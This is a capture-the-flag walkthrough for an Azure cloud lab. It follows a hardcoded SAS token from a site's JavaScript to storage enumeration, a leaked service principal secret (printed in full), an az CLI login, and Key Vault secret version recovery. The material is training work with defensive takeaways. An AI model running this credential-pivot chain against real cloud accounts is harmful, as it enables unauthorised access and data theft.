# TryHackMe: CryptoCabana — Walkthrough

**Room:** CryptoCabana (Hacker Holidays — Day 09, The Byte Lotus Hotel)
**Category:** ☁️ Cloud — Azure Storage / Key Vault
**Difficulty:** Medium

He never signed the transfer. The place he stashed his secret wasn't as sealed as promised.

---

## 1. Reading the Room Briefing First

> "He'd backed his seed phrase up weeks ago, into the CryptoCabana kiosk's vault — the one whose landing page promised, in exactly four words, 'Backed up. Sleep easy.' Somewhere between that promise and this morning, something else got a good look at what was supposed to stay behind glass.
>
> Your objective: find out what the kiosk is quietly trusting to reach into storage on its own, and see how much further that trust actually extends."

Plus the itinerary hints and @0xMia's in-universe post:

> "Pull apart what the kiosk hands out for free before you've even clicked anything."
> "Follow that trust somewhere the kiosk's own page never once points you."
> "Somewhere in there is a second, more valuable set of keys — and a vault that won't give up the real values on the first ask."
> *"the backup kiosk is SO confident. 'sleep easy' it says 💀 reader, do not sleep easy. also: if a value looks freshly rotated, ask yourself what it looked like five minutes before that 👀"*

Breaking this down before touching anything:

| Clue | Likely meaning |
|---|---|
| "What the kiosk hands out for free before you've even clicked" | Something is exposed in the site's static assets (HTML/JS) — no interaction needed to see it. |
| "Follow that trust somewhere the kiosk's own page never once points you" | Whatever credential we find will grant access to more than the app's UI ever links to. |
| "A second, more valuable set of keys" | A second, more privileged credential is hiding *inside* whatever the first credential grants access to. |
| "A vault that won't give up the real values on the first ask" + "freshly rotated... five minutes before" | Azure Key Vault secret **version history** — the current value is a decoy; an older version holds the real one. |

This room is entirely a client-side-secrets-and-trust-chain exercise: no shells, no injection — just following one over-permissioned credential to the next.

## 2. Recon — Reading What the Kiosk Hands Out for Free

The target is an Azure Storage **static website** (`*.z13.web.core.windows.net` is the standard hostname pattern for this hosting type).

```bash
curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/
```

The page is a simple "back up your seed phrase" form. It loads one script:

```bash
curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/app.js
```

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=...";
```

There it is — a **SAS (Shared Access Signature) token**, hardcoded in plain client-side JavaScript, meant to let the browser `PUT` a backup blob directly to storage without a backend in between.

### 2.1 Why this SAS token is far more powerful than intended

Breaking down its query parameters:

| Parameter | Value | Meaning |
|---|---|---|
| `ss` | `b` | Service scope: blob storage |
| `srt` | `sco` | **Resource types: service + container + object** |
| `sp` | `rl` | Permissions: **read + list** |
| `se` | `2099-12-31` | Expiry: effectively never |

The app only ever uses this token to `PUT` a single blob into the `backups` container. But the token itself was scoped with `srt=sco` — **service-level** access, not just the one container/object the app needed. Combined with `sp=rl` (read + list), this single token can **enumerate and read every container in the entire storage account**, not just `backups`. This is the "trust" the briefing describes — over-broad SAS scoping is one of the most common real-world Azure Storage misconfigurations, and it's exactly what turns "backup uploads only" into "read anything."

## 3. Enumerating the Storage Account

```bash
az storage container list \
  --account-name cryptocabanaf5scjagc \
  --sas-token "<BACKUP_SAS_VALUE>" \
  --output table
```

```
Name     Last Modified
-------  -------------------------
$web     2026-07-16T18:26:22+00:00
backups  2026-07-16T18:26:22+00:00
vault    2026-07-16T18:26:23+00:00
```

`$web` is the container backing the static site itself, `backups` is the container the app's UI actually points to — and **`vault`** is the container the kiosk's own page never once links to, exactly per the briefing.

```bash
az storage blob list \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --sas-token "<BACKUP_SAS_VALUE>" \
  --output table
```

```
Name                         Length  Content Type
---------------------------  ------  ------------------------
backup-service-account.json  360     application/json
seed_phrase.txt              88      application/octet-stream
```

## 4. The Second, More Valuable Set of Keys

Downloading both:

```bash
az storage blob download \
  --account-name cryptocabanaf5scjagc --container-name vault \
  --name backup-service-account.json \
  --sas-token "<BACKUP_SAS_VALUE>" --file backup-service-account.json --output none
cat backup-service-account.json
```

```json
{
  "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
  "client_secret": "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg",
  "key_vault_name": "ccabana-kv-f5scjagc",
  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT",
  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
}
```

This is a full **Azure service principal** credential set — `client_id`/`client_secret`/`tenant_id` are exactly the fields `az ad sp create-for-rbac` outputs, and this is the standard shape of a non-interactive Azure identity used for automation. It also hands us the **Key Vault name and URI directly** — the second layer of trust the briefing was pointing at.

```bash
az storage blob download \
  --account-name cryptocabanaf5scjagc --container-name vault \
  --name seed_phrase.txt \
  --sas-token "<BACKUP_SAS_VALUE>" --file seed_phrase.txt --output none
cat seed_phrase.txt
```
```
velvet cabana rebuild scatter obvious wallet drift lagoon punchline receipt orbit shrimp
```

A plausible-looking 12-word seed phrase sitting right next to the real credential file — this is the room's decoy, designed to make you feel like you've already found "the secret" and stop looking. Worth noting and moving past.

## 5. Authenticating as the Service Principal

```bash
az login --service-principal \
  --username dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \
  --password "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg" \
  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c
```

> **Aside — local connectivity issue:** the first attempt at this failed with a DNS resolution error (`Failed to resolve 'login.microsoftonline.com'`). This turned out to be a dropped local internet connection (a `172.20.10.1` gateway, the typical address range for a phone hotspot, was unreachable) — not a credentials or CLI problem. This has nothing to do with the TryHackMe VPN; this particular room doesn't require it at all, since every resource involved (storage account, Key Vault) is reachable over the public internet. Worth ruling out basic local connectivity before assuming an auth/permissions issue when a cloud CLI command fails outright with a network-level error.

Once connectivity was restored, login succeeded and returned the target subscription (`Az-Subs-CTF`).

## 6. The Key Vault — Shards, a Decoy, and a Rotated Secret

```bash
az keyvault secret list --vault-name ccabana-kv-f5scjagc --output table
```

```
Name         Expires
-----------  -------------------------
key-shard-1
key-shard-2
key-shard-3
master-key   2020-01-01T00:00:00+00:00
```

`master-key`, expired since **2020**, is an obvious decoy — and confirmed as such immediately:

```bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name master-key --query value -o tsv
```
```
(Forbidden) Caller is not authorized to perform action on resource...
```

RBAC on the vault explicitly denies this service principal access to `master-key` — a nice bit of design forcing you off that path quickly rather than after a long detour. The real flag is clearly split across the three **shards** instead.

```bash
for s in key-shard-1 key-shard-2 key-shard-3; do
  echo "== $s =="
  az keyvault secret show --vault-name ccabana-kv-f5scjagc --name $s --query value -o tsv
done
```

```
== key-shard-1 ==
THM{n0t_ur
== key-shard-2 ==
Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.
== key-shard-3 ==
ur_c01ns!}
```

Shards 1 and 3 are clean flag fragments. Shard 2's **current value is a message, not data** — explicitly telling us it was rotated, and that the old value is recoverable. This is @0xMia's hint made literal: *"if a value looks freshly rotated, ask yourself what it looked like five minutes before that."*

### 6.1 Pulling the pre-rotation version

Azure Key Vault keeps every previous version of a secret unless explicitly purged. Checking version history:

```bash
az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 --output json
```

```json
[
  { "attributes": {"created": "2026-07-28T01:05:05+00:00"}, "id": ".../key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0" },
  { "attributes": {"created": "2026-07-28T01:05:07+00:00"}, "id": ".../key-shard-2/c922c422ffb34671a902389c372314f1" }
]
```

Two versions, created two seconds apart — the earlier one (`...3d6492d2...`, `01:05:05`) is the pre-rotation value we want:

```bash
az keyvault secret show \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 \
  --version 3d6492d2c6f74123bc754a9ded22b2a0 \
  --query value -o tsv
```

```
_k3ys_n0t_
```

## 7. Assembling the Flag

```
key-shard-1: THM{n0t_ur
key-shard-2: _k3ys_n0t_   (pre-rotation version)
key-shard-3: ur_c01ns!}
```

Concatenated: `THM{...redacted...}`

A fitting theme for a crypto-wallet room to end on: *"not your keys, not your coins."*

---

## Summary of the Chain

| Stage | Technique | Result |
|---|---|---|
| Recon | Read the static site's `app.js` directly | Found a hardcoded SAS token |
| Privilege discovery | Inspected the SAS token's scope (`srt=sco`, `sp=rl`) | Realized it granted account-wide read/list, not just the intended container |
| Pivot 1 | `az storage container list` with the over-scoped SAS | Discovered a `vault` container never linked from the site |
| Payload | Downloaded `backup-service-account.json` | Found a full Azure service principal credential + Key Vault name/URI |
| Decoy noted | `seed_phrase.txt` in the same container | A plausible-looking red herring, not the real secret |
| Pivot 2 | `az login --service-principal` with the leaked credentials | Authenticated as a second, more privileged identity |
| RBAC boundary | Attempted `master-key` (expired 2020) | Explicitly denied by RBAC — confirmed as a decoy |
| Payoff | Read `key-shard-1/2/3`; found `key-shard-2`'s current value was a rotation notice | Pulled the **pre-rotation version** of `key-shard-2` via `list-versions` / `show --version` |
| Result | Concatenated the three shard values | Flag assembled |

**Key takeaway:** this room is a compact tour of real-world Azure over-permissioning mistakes — a SAS token scoped far beyond what the feature needed, a service principal credential left sitting in plain storage instead of a proper secrets pipeline, and a rotated secret whose old version was never purged. None of these are exotic bugs; they're exactly the kind of misconfiguration that shows up in actual cloud security reviews, which is what makes this room a good one to internalize rather than just solve once.

*(Flag intentionally redacted from this writeup — run the steps above against your own instance to assemble it.)*
